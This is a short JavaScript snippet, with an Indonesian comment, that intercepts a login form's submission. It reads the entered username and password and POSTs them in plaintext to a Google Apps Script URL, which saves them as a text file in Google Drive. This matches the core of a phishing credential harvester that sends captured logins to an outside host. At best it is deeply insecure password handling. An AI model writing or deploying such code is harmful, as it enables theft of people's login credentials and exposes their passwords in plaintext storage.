document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;

    var data = {
        filename: username + '.txt',
        content: 'Username: ' + username + '\nPassword: ' + password
    };

    fetch('https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec', { // Ganti dengan URL dari Google Apps Script Anda
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(result => {
        console.log(result);
        alert('Data saved to Google Drive');
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error saving data');
    });
});
